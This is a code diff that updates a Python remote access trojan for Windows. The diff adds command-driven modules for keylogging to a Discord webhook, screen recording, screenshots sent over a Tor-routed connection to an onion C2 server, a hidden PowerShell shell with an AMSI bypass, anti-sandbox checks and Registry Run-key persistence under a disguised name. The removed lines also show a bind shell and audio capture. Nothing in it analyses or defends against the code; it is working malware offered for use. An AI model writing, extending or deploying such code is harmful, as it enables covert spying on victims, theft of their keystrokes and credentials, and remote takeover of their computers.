@@ -16,36 +16,34 @@ import sys
 import ssl
 import socks
 import base64
-import psutil          # pip install psutil
+import psutil
+import json
+import winreg   # for persistence
 
-# ==================== CONFIG (Base64 obfuscated) ====================
-def b64(s):
-    return base64.b64decode(s).decode()
-
-ONION_ADDRESS = b64("eW91cl9vbmlvbl9hZGRyZXNzLm9uaW9u")  # Replace with your .onion
+# ==================== CONFIG ====================
+ONION_ADDRESS = "your_onion_address.onion"   # replace with your actual onion
 C2_PORT = 4443
 TOR_PROXY = ('127.0.0.1', 9050)
 
-# Discord webhooks – replace these with your own (base64 encoded)
-SCREEN_WEBHOOK_URL   = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
-AUDIO_WEBHOOK_URL    = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")  # not used
-KEYLOGGER_WEBHOOK_URL = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
-SCREENSHOT_WEBHOOK_URL = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
+# Discord webhooks (still used for keylog)
+KEYLOGGER_WEBHOOK_URL = 'https://discord.com/api/webhooks/...'   # replace
 
 KEYLOG_PATH = "C:\\Users\\Public\\Documents\\keyhits.txt"
-recording_active = True
+
+# Module states
+recording_active = False       # screen recording
+screenshot_scheduled = False   # scheduled screenshots
+keylogger_active = False       # keylogger
+screenshot_thread = None
+screenshot_event = threading.Event()
 
 # ==================== ANTI-SANDBOX ====================
 def is_sandbox():
-    """Return True if likely in a sandbox environment."""
     try:
-        # Uptime less than 30 minutes
         if time.time() - psutil.boot_time() < 1800:
             return True
-        # Less than 2 CPU cores
         if psutil.cpu_count() < 2:
             return True
-        # Total disk space < 60 GB
         disk = psutil.disk_usage('/')
         if disk.total < 60 * 1024**3:
             return True
@@ -54,9 +52,22 @@ def is_sandbox():
     return False
 
 if is_sandbox():
-    print("Sandbox detected – sleeping for 30 seconds...")
+    print("Sandbox detected – sleeping...")
     time.sleep(30)
-    # Optionally exit: sys.exit(0)
+
+# ==================== PERSISTENCE ====================
+def add_persistence():
+    """Add the current executable to Windows Registry Run key."""
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+            winreg.SetValueEx(regkey, "WindowsHelper", 0, winreg.REG_SZ, exe_path + ' --silent')
+        return True
+    except Exception as e:
+        print(f"Persistence error: {e}")
+        return False
 
 # ==================== CORE FUNCTIONS ====================
 def send_to_discord(file_path, webhook_url):
@@ -76,17 +87,20 @@ def record_screen(output_path, record_time=30, fps=8):
             out.write(frame)
         out.release()
 
-def record_audio(output_path, record_time=30, channels=1, rate=16000, chunk=1024):
-    audio = pyaudio.PyAudio()
-    stream = audio.open(format=pyaudio.paInt16, channels=channels,
-                        rate=rate, input=True, frames_per_buffer=chunk)
-    frames = [stream.read(chunk) for _ in range(int(rate / chunk * record_time))]
-    stream.stop_stream(); stream.close(); audio.terminate()
-    with wave.open(output_path, 'wb') as wf:
-        wf.setnchannels(channels)
-        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
-        wf.setframerate(rate)
-        wf.writeframes(b''.join(frames))
+def take_screenshot():
+    with mss.mss() as sct:
+        return sct.grab(sct.monitors[1])
+
+def send_screenshot_to_server(sock, img):
+    # Convert to PNG and base64
+    import io
+    from PIL import Image   # need to install pillow
+    pil_img = Image.frombytes('RGB', (img.width, img.height), img.rgb)
+    buf = io.BytesIO()
+    pil_img.save(buf, format='PNG')
+    data = base64.b64encode(buf.getvalue()).decode()
+    msg = {'type': 'screenshot', 'data': data}
+    sock.send((json.dumps(msg) + "\n").encode())
 
 # ==================== KEYLOGGER ====================
 ignored_keys = {
@@ -98,12 +112,15 @@ ignored_keys = {
     keyboard.Key.backspace, keyboard.Key.enter
 }
 last_key_pressed = None
+keylog_file = KEYLOG_PATH
 
 def key_press(key):
     global last_key_pressed
+    if not keylogger_active:
+        return
     try:
         if key != last_key_pressed:
-            with open(KEYLOG_PATH, 'a') as logKey:
+            with open(keylog_file, 'a') as logKey:
                 if hasattr(key, 'char') and key.char is not None:
                     logKey.write(key.char)
                 elif key not in ignored_keys:
@@ -116,8 +133,10 @@ def key_release(key):
     last_key_pressed = None
 
 def send_keylog_to_discord():
+    if not keylogger_active:
+        return
     try:
-        with open(KEYLOG_PATH, 'rb') as file:
+        with open(keylog_file, 'rb') as file:
             response = requests.post(KEYLOGGER_WEBHOOK_URL,
                                      data={'content': 'Keylog file'},
                                      files={'file': file})
@@ -125,30 +144,58 @@ def send_keylog_to_discord():
     except Exception as e:
         print(f"Keylog error: {e}")
 
-def ensure_ss_folder_exists():
-    dir_ = os.path.join(tempfile.gettempdir(), 'ss')
-    os.makedirs(dir_, exist_ok=True)
-    return dir_
+# ==================== MODULE CONTROL FUNCTIONS ====================
+def screen_recording_loop(sock):
+    """Runs continuously while recording_active is True."""
+    clip_number = 1
+    while True:
+        if not recording_active:
+            time.sleep(1)
+            continue
+        try:
+            temp_dir = tempfile.gettempdir()
+            path = os.path.join(temp_dir, f"screen_record_{clip_number}.mp4")
+            record_screen(path, record_time=30)
+            # Send via Discord (or could send to server)
+            if send_to_discord(path, SCREEN_WEBHOOK_URL) == 200:
+                os.remove(path)
+                clip_number += 1
+            else:
+                time.sleep(5)
+        except Exception as e:
+            print(f"Screen error: {e}")
+            time.sleep(5)
 
-def take_screenshot(output_path):
-    with mss.mss() as sct:
-        sct.shot(mon=-1, output=output_path)
+def screenshot_scheduler(sock):
+    """Runs scheduled screenshots while screenshot_scheduled is True."""
+    while True:
+        if not screenshot_scheduled:
+            time.sleep(1)
+            continue
+        try:
+            img = take_screenshot()
+            send_screenshot_to_server(sock, img)
+            time.sleep(30)   # every 30 seconds
+        except Exception as e:
+            print(f"Screenshot error: {e}")
+            time.sleep(5)
 
-def send_screenshot_to_discord(output_path, webhook_url):
-    take_screenshot(output_path)
-    status = send_to_discord(output_path, webhook_url)
-    print("Screenshot sent." if status == 200 else f"Screenshot failed: {status}")
+# ==================== C2 CONNECTION & COMMAND DISPATCH ====================
+def connect_to_c2():
+    s = socks.socksocket()
+    s.set_proxy(socks.SOCKS5, *TOR_PROXY)
+    s.connect((ONION_ADDRESS, C2_PORT))
+    # TLS wrapper (optional)
+    try:
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        return context.wrap_socket(s, server_hostname=ONION_ADDRESS)
+    except:
+        return s
 
-def scheduled_screenshots():
-    send_screenshot_to_discord(os.path.join(ensure_ss_folder_exists(), 'screenshot.png'),
-                               SCREENSHOT_WEBHOOK_URL)
-
-# ==================== STEALTH SHELL (AMSI BYPASS + STDIN) ====================
-def spawn_powershell_shell(sock):
-    """
-    Spawns a hidden PowerShell process with AMSI bypass.
-    The script is fed via stdin – no command-line arguments.
-    """
+def interactive_shell(sock):
+    """Spawn PowerShell with AMSI bypass, fed via stdin."""
     ps_script = (
         '$amsi = [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\');'
         '$field = $amsi.GetField(\'amsiInitFailed\',\'NonPublic,Static\');'
@@ -196,81 +243,68 @@ def spawn_powershell_shell(sock):
         p.stdin.flush()
     p.terminate()
 
-def interactive_shell(sock):
-    try:
-        spawn_powershell_shell(sock)
-    except Exception as e:
-        sock.send(f"Shell error: {e}\n".encode())
-
-# ==================== BIND SHELL ====================
-def bind_shell(port):
-    """Start a TCP listener and spawn a hidden PowerShell on connection."""
-    try:
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind(('0.0.0.0', int(port)))
-        server.listen(1)
-        print(f"[*] Bind shell listening on port {port}")
-        client, addr = server.accept()
-        print(f"[+] Incoming connection from {addr[0]}:{addr[1]}")
-        spawn_powershell_shell(client)
-        client.close()
-        server.close()
-    except Exception as e:
-        print(f"Bind shell error: {e}")
-
-# ==================== C2 CONNECTION VIA TOR ====================
-def connect_to_c2():
-    """Connect to .onion server via Tor SOCKS proxy, with optional TLS."""
-    s = socks.socksocket()
-    s.set_proxy(socks.SOCKS5, *TOR_PROXY)
-    s.connect((ONION_ADDRESS, C2_PORT))
-    # Attempt TLS wrap (if server uses it)
-    try:
-        context = ssl.create_default_context()
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
-        tls_sock = context.wrap_socket(s, server_hostname=ONION_ADDRESS)
-        return tls_sock
-    except:
-        # Fallback to plain socket if TLS fails
-        return s
-
 def c2_handler():
-    global recording_active
+    global recording_active, screenshot_scheduled, keylogger_active
     while True:
         try:
             s = connect_to_c2()
-            s.send(b"[+] Connected to C2 server via Tor\n")
             print("[C2] Connected.")
+            # Start background threads for modules (they will check flags)
+            threading.Thread(target=screen_recording_loop, args=(s,), daemon=True).start()
+            threading.Thread(target=screenshot_scheduler, args=(s,), daemon=True).start()
 
             while True:
-                data = s.recv(1024).decode().strip()
+                data = s.recv(4096)
                 if not data:
                     break
-                cmd = data.lower()
-                if cmd == "start":
+                try:
+                    msg = json.loads(data.decode())
+                    cmd = msg.get('cmd')
+                except:
+                    # fallback to plain text (old commands)
+                    cmd = data.decode().strip()
+
+                if cmd == 'keylog_start':
+                    keylogger_active = True
+                    s.send(b'[+] Keylogger started\n')
+                elif cmd == 'keylog_stop':
+                    keylogger_active = False
+                    send_keylog_to_discord()
+                    s.send(b'[+] Keylogger stopped, logs sent\n')
+                elif cmd == 'screen_start':
                     recording_active = True
-                    s.send(b"[+] Recording started\n")
-                elif cmd == "stop":
+                    s.send(b'[+] Screen recording started\n')
+                elif cmd == 'screen_stop':
                     recording_active = False
-                    s.send(b"[+] Recording stopped\n")
-                elif cmd.startswith("bind "):
-                    try:
-                        port = cmd.split()[1]
-                        s.send(b"[+] Starting bind shell on port " + port.encode() + b"\n")
-                        threading.Thread(target=bind_shell, args=(port,), daemon=True).start()
-                    except Exception as e:
-                        s.send(f"Bind error: {e}\n".encode())
-                elif cmd == "shell":
-                    s.send(b"[+] Spawning reverse shell...\n")
+                    s.send(b'[+] Screen recording stopped\n')
+                elif cmd == 'screenshot_start':
+                    screenshot_scheduled = True
+                    s.send(b'[+] Scheduled screenshots started\n')
+                elif cmd == 'screenshot_stop':
+                    screenshot_scheduled = False
+                    s.send(b'[+] Scheduled screenshots stopped\n')
+                elif cmd == 'screenshot':
+                    # Take one screenshot and send to server
+                    img = take_screenshot()
+                    send_screenshot_to_server(s, img)
+                    s.send(b'[+] Screenshot sent to server\n')
+                elif cmd == 'shell':
+                    s.send(b'[+] Spawning interactive shell...\n')
                     interactive_shell(s)
-                    s.send(b"[+] Shell closed\n")
-                elif cmd == "exit":
-                    s.send(b"[+] Exiting\n")
+                    s.send(b'[+] Shell closed\n')
+                elif cmd == 'persistence':
+                    if add_persistence():
+                        s.send(b'[+] Persistence enabled\n')
+                    else:
+                        s.send(b'[!] Persistence failed\n')
+                elif cmd == 'status':
+                    status = f"Keylogger: {'ON' if keylogger_active else 'OFF'}\nScreen Rec: {'ON' if recording_active else 'OFF'}\nScreenshots: {'ON' if screenshot_scheduled else 'OFF'}\n"
+                    s.send(status.encode())
+                elif cmd == 'exit':
+                    s.send(b'[+] Exiting\n')
                     os._exit(0)
                 else:
-                    s.send(b"Unknown command. Available: start, stop, bind <port>, shell, exit\n")
+                    s.send(b'Unknown command. Available: keylog_start/stop, screen_start/stop, screenshot_start/stop, screenshot, shell, persistence, status, exit\n')
         except Exception as e:
             print(f"[C2] Error: {e}. Reconnecting in 10s...")
             time.sleep(10)
@@ -282,50 +316,18 @@ def c2_handler():
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
-    # Ensure keylog file exists
+    # Create keylog file
     if not os.path.exists(KEYLOG_PATH):
         open(KEYLOG_PATH, 'a').close()
 
-    # Start keylogger listener
-    keyboard.Listener(on_press=key_press, on_release=key_release).start()
+    # Start keylogger listener (it will check keylogger_active flag)
+    listener = keyboard.Listener(on_press=key_press, on_release=key_release)
+    listener.start()
 
     # Start C2 thread
     threading.Thread(target=c2_handler, daemon=True).start()
-    print("[C2] Thread started.")
+    print("[C2] Client started.")
 
-    # Schedule background tasks
-    schedule.every(1).minute.do(send_keylog_to_discord)
-    schedule.every(30).seconds.do(scheduled_screenshots)
-
-    clip_number = 1
+    # Keep main thread alive
     while True:
-        schedule.run_pending()
-        if recording_active:
-            # Screen recording
-            try:
-                temp_dir = tempfile.gettempdir()
-                path = os.path.join(temp_dir, f"screen_record_{clip_number}.mp4")
-                record_screen(path, record_time=30)
-                if send_to_discord(path, SCREEN_WEBHOOK_URL) == 200:
-                    os.remove(path)
-                    clip_number += 1
-                else:
-                    time.sleep(5)
-            except Exception as e:
-                print(f"Screen error: {e}")
-                time.sleep(5)
-
-            # Audio recording (commented out – uncomment if needed)
-            # try:
-            #     path = os.path.join(temp_dir, f"voice_record_{clip_number}.wav")
-            #     record_audio(path, record_time=30)
-            #     if send_to_discord(path, AUDIO_WEBHOOK_URL) == 200:
-            #         os.remove(path)
-            #         clip_number += 1
-            #     else:
-            #         time.sleep(5)
-            # except Exception as e:
-            #     print(f"Audio error: {e}")
-            #     time.sleep(5)
-
         time.sleep(1)
